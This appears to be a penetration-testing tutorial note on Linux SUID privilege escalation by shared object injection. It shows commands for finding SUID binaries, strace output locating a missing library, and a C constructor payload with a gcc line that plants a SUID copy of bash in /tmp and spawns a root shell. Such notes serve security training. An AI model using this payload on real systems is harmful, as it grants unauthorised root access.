# SUID

SUID bit enables any user to execute a binary with the permissions of its owner. This can lead to various security vulneribilities with improper use on systems.

[GTFOBins](https://gtfobins.github.io) contains methods to abuse certain SUID binaries for various purposes. Following shell snippet shows how to find SUID binaries on a system;

``` bash
user@host:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
...
user@host:~$ ls -la /usr/bin/chsh
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
```

Not all binaries are vulnerable to SUID abuse and some binaries have SUID bit set by default.

### Shared Object Injection
Binaries are linked with libraries/shared objects which provides functionality to the application. Shared object injection aims to overwrite vulnerable shared objects with malicious payloads to be executed by the application.

`strace` can be used to locate shared objects that a binary is trying to access at execution;

``` bash
user@host:~$ find / -perm -u=s -type f 2>/dev/null 
...
/usr/local/bin/suid-so
...
user@host:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
user@host:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i "no such file"
...
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory) # vulnerable shared object
```

Following payload can be used with SUID binaries (as shown above) to spawn an escalated shell instance;

``` c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile the payload with;

``` bash
gcc -shared -fPIC -o /path/to/vulnerable/object.so payload.c
```

Once the binary is executed, the payload will activate and give and provide us a root shell.
